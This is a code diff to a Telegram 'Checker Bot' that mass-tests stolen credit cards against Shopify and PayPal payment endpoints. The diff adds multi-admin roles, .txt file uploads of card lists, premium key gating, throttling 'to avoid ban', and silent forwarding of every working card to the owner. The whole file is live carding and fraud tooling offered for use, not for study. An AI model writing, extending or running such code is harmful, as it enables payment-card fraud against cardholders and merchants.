@@ -5,6 +5,7 @@ import string
 import json
 import time
 import re
+import logging
 import aiohttp
 from datetime import datetime, timedelta
 
@@ -21,8 +22,24 @@ from aiogram.client.default import DefaultBotProperties
 from api import process_card_async, parse_cc_string, extract_clean_response
 from paypal import check_paypal_cc 
 
-BOT_TOKEN = os.getenv("BOT_TOKEN") 
-ADMIN_ID = os.getenv("ADMIN_ID") 
+# --- LOGGING ---
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+# --- ENV VARIABLES & ROLE SYSTEM ---
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
+# Safely parse OWNER and ADMIN IDs
+OWNER_ID = str(os.getenv("OWNER_ID", "")).strip()
+_admin_env = str(os.getenv("ADMIN_IDS", os.getenv("ADMIN_ID", "")))
+ADMIN_IDS = [x.strip() for x in _admin_env.split(",") if x.strip()]
+
+# Ensure OWNER is always in ADMIN_IDS
+if OWNER_ID and OWNER_ID not in ADMIN_IDS:
+    ADMIN_IDS.append(OWNER_ID)
+
+# Fallback if OWNER_ID isn't explicitly set but ADMIN_ID is
+if not OWNER_ID and ADMIN_IDS:
+    OWNER_ID = ADMIN_IDS[0]
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
@@ -44,8 +61,11 @@ def load_db(filename):
 def save_db(filename, data):
     with open(filename, "w") as f: json.dump(data, f, indent=4)
 
+def is_admin(user_id: str) -> bool:
+    return str(user_id) in ADMIN_IDS
+
 def check_tier(user_id):
-    if str(user_id) == str(ADMIN_ID): return "👑 ADMIN"
+    if is_admin(user_id): return "👑 ADMIN"
     db = load_db(PREMIUM_FILE)
     if str(user_id) in db:
         expiry = datetime.fromisoformat(db[str(user_id)])
@@ -78,8 +98,11 @@ async def get_bin_info(session, cc):
 class AppStates(StatesGroup):
     waiting_shopify_single = State()
     waiting_shopify_mass = State()
+    waiting_shopify_mass_file = State()
+    
     waiting_paypal_single = State()
     waiting_paypal_mass = State()
+    waiting_paypal_mass_file = State()
 
 # --- RESULT UI FORMATTER ---
 def format_result(status, checker, result, cc, country, flag, bank, brand, c_type, total, app, dec, err, start_time, tier, username):
@@ -87,7 +110,7 @@ def format_result(status, checker, result, cc, country, flag, bank, brand, c_typ
     speed = total / elapsed if elapsed > 0 else 0
     hit_rate = round((app / total * 100), 2) if total > 0 else 0
     
-    icon = "✅" if status in ["APPROVED", "CHARGED"] else "❌" if status == "DECLINED" else "⚠️"
+    icon = "✅" if status in ["APPROVED", "CHARGED", "LIVE"] else "❌" if status == "DECLINED" else "⚠️"
     
     return f"""<code>━━━━━━━━━━━━━━━━━━━━
 {icon} {checker} — {result}
@@ -114,22 +137,23 @@ def format_result(status, checker, result, cc, country, flag, bank, brand, c_typ
 👤 User       : @{username}
 ━━━━━━━━━━━━━━━━━━━━</code>"""
 
-# --- CORE MENU & UTILS ---
+# --- CORE COMMANDS ---
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
-    add_user(message.from_user.id)
+    uid = str(message.from_user.id)
+    add_user(uid)
+    logging.info(f"User {uid} triggered /start")
     
-    is_admin = str(message.from_user.id) == str(ADMIN_ID)
-    
-    # Base menu for ALL users
     menu_text = (
         "<code>👋 Welcome to the Checker Bot\n\n"
         "📌 Available Commands:\n\n"
         "💳 Checkers:\n"
-        "• /paypal_mass → Mass PayPal check\n"
+        "• /paypal_mass_file → Mass PayPal (.txt file)\n"
+        "• /paypal_mass → Mass PayPal (Text)\n"
         "• /paypal_single → Single PayPal check\n"
-        "• /shopify_mass → Mass Shopify check\n"
+        "• /shopify_mass_file → Mass Shopify (.txt file)\n"
+        "• /shopify_mass → Mass Shopify (Text)\n"
         "• /shopify_single → Single Shopify check\n\n"
         "🔑 Keys:\n"
         "• /redeem → Redeem a key\n\n"
@@ -137,8 +161,7 @@ async def cmd_start(message: Message, state: FSMContext):
         "• /status → View your plan/status\n"
     )
     
-    # Append Admin commands ONLY if the user is the Admin
-    if is_admin:
+    if is_admin(uid):
         menu_text += (
             "\n👑 Admin Commands:\n"
             "• /genkey <qty> <days> → Generate keys\n"
@@ -147,14 +170,14 @@ async def cmd_start(message: Message, state: FSMContext):
         )
         
     menu_text += "━━━━━━━━━━━━━━━━━━━━</code>"
-    
     await message.answer(menu_text)
 
 @router.message(Command("status"))
-async def cmd_status(message: Message):
-    tier = check_tier(message.from_user.id)
-    db = load_db(PREMIUM_FILE)
+async def cmd_status(message: Message, state: FSMContext):
+    await state.clear()
     uid = str(message.from_user.id)
+    tier = check_tier(uid)
+    db = load_db(PREMIUM_FILE)
     
     if tier == "👑 ADMIN":
         expiry_text = "Lifetime"
@@ -168,8 +191,10 @@ async def cmd_status(message: Message):
 
 # --- KEY & ADMIN SYSTEM ---
 @router.message(Command("genkey"))
-async def cmd_genkey(message: Message, command: CommandObject):
-    if str(message.from_user.id) != str(ADMIN_ID): 
+async def cmd_genkey(message: Message, command: CommandObject, state: FSMContext):
+    await state.clear()
+    uid = str(message.from_user.id)
+    if not is_admin(uid): 
         return await message.answer("❌ Admin only command.")
     
     args = command.args
@@ -179,14 +204,8 @@ async def cmd_genkey(message: Message, command: CommandObject):
     try:
         parts = args.split()
         count = int(parts[0])
-        duration_str = parts[1].lower()
-        
-        days = 0
-        if 'd' in duration_str:
-            days = int(duration_str.replace('d', ''))
-        else:
-            days = int(duration_str)
-            
+        dur_str = parts[1].lower()
+        days = int(dur_str.replace('d', '')) if 'd' in dur_str else int(dur_str)
     except:
         return await message.answer("⚠️ Invalid format. Use: <code>/genkey 10 7d</code>")
         
@@ -203,7 +222,8 @@ async def cmd_genkey(message: Message, command: CommandObject):
     await message.answer(res)
 
 @router.message(Command("redeem"))
-async def cmd_redeem(message: Message, command: CommandObject):
+async def cmd_redeem(message: Message, command: CommandObject, state: FSMContext):
+    await state.clear()
     key = command.args
     if not key:
         return await message.answer("⚠️ Usage: <code>/redeem &lt;key&gt;</code>")
@@ -232,8 +252,9 @@ async def cmd_redeem(message: Message, command: CommandObject):
     await message.answer(f"✅ <b>Successfully Redeemed!</b>\nAdded {days} days to your subscription.")
 
 @router.message(Command("broadcast"))
-async def cmd_broadcast(message: Message, command: CommandObject):
-    if str(message.from_user.id) != str(ADMIN_ID): return
+async def cmd_broadcast(message: Message, command: CommandObject, state: FSMContext):
+    await state.clear()
+    if not is_admin(str(message.from_user.id)): return
     if not command.args: return await message.answer("⚠️ Include a message to broadcast.")
     
     users = load_db(USERS_FILE)
@@ -250,23 +271,24 @@ async def cmd_broadcast(message: Message, command: CommandObject):
     await msg.edit_text(f"✅ Broadcast complete. Sent to {sent}/{len(users)} users.")
 
 @router.message(Command("users"))
-async def cmd_users(message: Message):
-    if str(message.from_user.id) != str(ADMIN_ID): return
+async def cmd_users(message: Message, state: FSMContext):
+    await state.clear()
+    if not is_admin(str(message.from_user.id)): return
     users = load_db(USERS_FILE)
     prem = load_db(PREMIUM_FILE)
     await message.answer(f"📊 <b>Bot Statistics</b>\n━━━━━━━━━━\n👥 Total Users: {len(users)}\n💎 Premium Users: {len(prem)}")
 
-# --- CHECKER PROCESSOR (SINGLE & MASS) ---
-async def process_checker(message: Message, text: str, checker: str):
-    tier = check_tier(message.from_user.id)
+# --- CHECKER PROCESSOR (CORE ENGINE) ---
+async def process_checker(message: Message, ccs: list, checker: str):
+    user_id = str(message.from_user.id)
+    tier = check_tier(user_id)
+    
     if tier == "🆓 FREE" and "mass" in checker.lower():
         return await message.answer("❌ Upgrade to Premium to use Mass Checkers.")
         
-    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", text)
-    if not ccs:
-        return await message.answer("❌ No valid cards found. Ensure format is CC|MM|YYYY|CVV")
-        
     total_cards = len(ccs)
+    if total_cards == 0:
+        return await message.answer("❌ No valid cards found. Ensure format is CC|MM|YYYY|CVV")
     if total_cards > 1 and "single" in checker.lower():
         return await message.answer("⚠️ You provided multiple cards for a Single Check. Use Mass Check instead.")
         
@@ -278,11 +300,13 @@ async def process_checker(message: Message, text: str, checker: str):
     
     async with aiohttp.ClientSession() as session:
         for idx, cc in enumerate(ccs, 1):
-            # Parse CC safely
-            parts = parse_cc_string(cc)
-            cc_clean, mes, ano, cvv = parts['cc'], parts['mes'], parts['ano'], parts['cvv']
-            
-            # Fetch BIN (Doesn't crash on fail)
+            try:
+                parts = parse_cc_string(cc)
+                cc_clean, mes, ano, cvv = parts['cc'], parts['mes'], parts['ano'], parts['cvv']
+            except ValueError:
+                err += 1
+                continue
+                
             brand, bank, country, flag, c_type = await get_bin_info(session, cc_clean)
             
             try:
@@ -290,95 +314,130 @@ async def process_checker(message: Message, text: str, checker: str):
                     success, raw, g_name, p, c = await process_card_async(cc_clean, mes, ano, cvv, "https://shop.spam.com")
                     status = "CHARGED" if success else "DECLINED"
                     resp = extract_clean_response(raw)
-                else: # PayPal
+                else: 
                     status, raw = await asyncio.to_thread(check_paypal_cc, cc)
                     resp = extract_clean_response(raw)
             except Exception as e:
                 status, resp = "ERROR", str(e)[:30]
                 
-            # Update Counters
-            if status in ["APPROVED", "CHARGED"]: app += 1
+            if status in ["APPROVED", "CHARGED", "LIVE"]: app += 1
             elif status == "DECLINED": dec += 1
             else: err += 1
             
-            # Format UI string
             ui_text = format_result(
                 status, checker, resp, cc, country, flag, bank, brand, c_type, 
-                idx, app, dec, err, start_time, tier, username
+                total_cards, app, dec, err, start_time, tier, username
             )
             
-            # Handle Hits (Silent Admin notification & separate user message)
+            # Hit Handling: Notify User AND Owner (Silently)
             if status in ["APPROVED", "CHARGED", "LIVE"]:
-                await message.answer(ui_text) # Send isolated hit to User
-                if str(message.from_user.id) != str(ADMIN_ID):
-                    try: await bot.send_message(ADMIN_ID, f"🔥 <b>NEW HIT</b>\n{ui_text}")
+                await message.answer(ui_text) 
+                if OWNER_ID:
+                    try: await bot.send_message(OWNER_ID, f"🔥 <b>NEW HIT ALERT</b>\n{ui_text}")
                     except: pass
             
-            # Update Progress Message
+            # Update Progress (Throttle edits to avoid ban)
             if total_cards == 1 or (idx % 3 == 0) or idx == total_cards:
-                progress_header = f"⏳ <b>Checking... ({idx}/{total_cards})</b>\n\n" if idx < total_cards else f"✅ <b>Check Completed!</b>\n\n"
-                try: await msg.edit_text(progress_header + ui_text)
+                header = f"⏳ <b>Checking... ({idx}/{total_cards})</b>\n\n" if idx < total_cards else f"✅ <b>Check Completed!</b>\n\n"
+                try: await msg.edit_text(header + ui_text)
                 except: pass
                 
-            # Anti-Spam / Rate Limit protection
             await asyncio.sleep(0.5)
 
-# --- COMMAND ROUTERS (ENTRY POINTS) ---
+# --- COMMAND ENTRY POINTS (CHECKERS) ---
 @router.message(Command("shopify_single"))
 async def start_shopify_single(message: Message, state: FSMContext):
-    await message.answer("🟢 Send the card to check (CC|MM|YYYY|CVV):")
     await state.set_state(AppStates.waiting_shopify_single)
+    await message.answer("🟢 Send the card to check (Text only):")
 
 @router.message(Command("shopify_mass"))
 async def start_shopify_mass(message: Message, state: FSMContext):
-    await message.answer("🟢 Send your list of cards for Mass Check:")
     await state.set_state(AppStates.waiting_shopify_mass)
+    await message.answer("🟢 Send your list of cards (Text format):")
+
+@router.message(Command("shopify_mass_file"))
+async def start_shopify_mass_file(message: Message, state: FSMContext):
+    await state.set_state(AppStates.waiting_shopify_mass_file)
+    await message.answer("🟢 Upload your <b>.txt</b> file containing the cards:")
 
 @router.message(Command("paypal_single"))
 async def start_paypal_single(message: Message, state: FSMContext):
-    await message.answer("🔵 Send the card to check (CC|MM|YYYY|CVV):")
     await state.set_state(AppStates.waiting_paypal_single)
+    await message.answer("🔵 Send the card to check (Text only):")
 
 @router.message(Command("paypal_mass"))
 async def start_paypal_mass(message: Message, state: FSMContext):
-    await message.answer("🔵 Send your list of cards for Mass Check:")
     await state.set_state(AppStates.waiting_paypal_mass)
+    await message.answer("🔵 Send your list of cards (Text format):")
 
-# --- FSM PROCESSORS ---
-@router.message(AppStates.waiting_shopify_single)
-async def exe_shopify_single(message: Message, state: FSMContext):
-    await state.clear()
-    await process_checker(message, message.text, "Shopify Single")
+@router.message(Command("paypal_mass_file"))
+async def start_paypal_mass_file(message: Message, state: FSMContext):
+    await state.set_state(AppStates.waiting_paypal_mass_file)
+    await message.answer("🔵 Upload your <b>.txt</b> file containing the cards:")
 
-@router.message(AppStates.waiting_shopify_mass)
-async def exe_shopify_mass(message: Message, state: FSMContext):
-    await state.clear()
-    text = message.text
-    if message.document:
-        # Download document if they uploaded a .txt file instead of pasting
-        file = await bot.get_file(message.document.file_id)
-        result = await bot.download_file(file.file_path)
-        text = result.read().decode('utf-8')
-    await process_checker(message, text, "Shopify Mass")
 
-@router.message(AppStates.waiting_paypal_single)
-async def exe_paypal_single(message: Message, state: FSMContext):
-    await state.clear()
-    await process_checker(message, message.text, "PayPal Single ($1)")
+# --- FSM HANDLERS (CAPTURING INPUTS) ---
 
-@router.message(AppStates.waiting_paypal_mass)
-async def exe_paypal_mass(message: Message, state: FSMContext):
+# 1. TEXT Handlers (Single & Mass Text)
+@router.message(AppStates.waiting_shopify_single, F.text)
+@router.message(AppStates.waiting_shopify_mass, F.text)
+@router.message(AppStates.waiting_paypal_single, F.text)
+@router.message(AppStates.waiting_paypal_mass, F.text)
+async def handle_text_checkers(message: Message, state: FSMContext):
+    current_state = await state.get_state()
     await state.clear()
-    text = message.text
-    if message.document:
-        file = await bot.get_file(message.document.file_id)
-        result = await bot.download_file(file.file_path)
-        text = result.read().decode('utf-8')
-    await process_checker(message, text, "PayPal Mass ($1)")
+    
+    if message.text.startswith('/'): return # Prevent commands catching in FSM
+    
+    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", message.text)
+    
+    if "shopify_single" in current_state: name = "Shopify Single"
+    elif "shopify_mass" in current_state: name = "Shopify Mass"
+    elif "paypal_single" in current_state: name = "PayPal Single"
+    else: name = "PayPal Mass"
+    
+    await process_checker(message, ccs, name)
+
+# 2. FILE Handlers (Strictly .txt documents)
+@router.message(AppStates.waiting_shopify_mass_file, F.document)
+@router.message(AppStates.waiting_paypal_mass_file, F.document)
+async def handle_file_checkers(message: Message, state: FSMContext):
+    current_state = await state.get_state()
+    await state.clear()
+    
+    if not message.document.file_name.endswith('.txt'):
+        return await message.answer("❌ Invalid format. Please upload a .txt file.")
+        
+    msg = await message.answer("⏳ Downloading file...")
+    file = await bot.get_file(message.document.file_id)
+    downloaded = await bot.download_file(file.file_path)
+    text = downloaded.read().decode('utf-8')
+    await msg.delete()
+    
+    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", text)
+    name = "Shopify Mass File" if "shopify" in current_state else "PayPal Mass File"
+    
+    await process_checker(message, ccs, name)
+
+# 3. Catch-all for wrong inputs during state (e.g. sending text when file expected)
+@router.message(AppStates.waiting_shopify_mass_file, F.text)
+@router.message(AppStates.waiting_paypal_mass_file, F.text)
+async def handle_wrong_file_input(message: Message, state: FSMContext):
+    if message.text.startswith('/'): 
+        await state.clear()
+        return
+    await message.answer("❌ You selected a file check. Please upload a <b>.txt</b> file.")
+
+@router.message(AppStates.waiting_shopify_single, F.document)
+@router.message(AppStates.waiting_shopify_mass, F.document)
+@router.message(AppStates.waiting_paypal_single, F.document)
+@router.message(AppStates.waiting_paypal_mass, F.document)
+async def handle_wrong_text_input(message: Message):
+    await message.answer("❌ You selected a text check. Please paste the cards directly.")
 
 # --- MAIN DEPLOYMENT ---
 async def main():
-    print("BEAR OS PRO DEPLOYED - COMMAND SYSTEM READY")
+    logging.info("BEAR OS PRO DEPLOYED - ADVANCED COMMAND SYSTEM READY")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
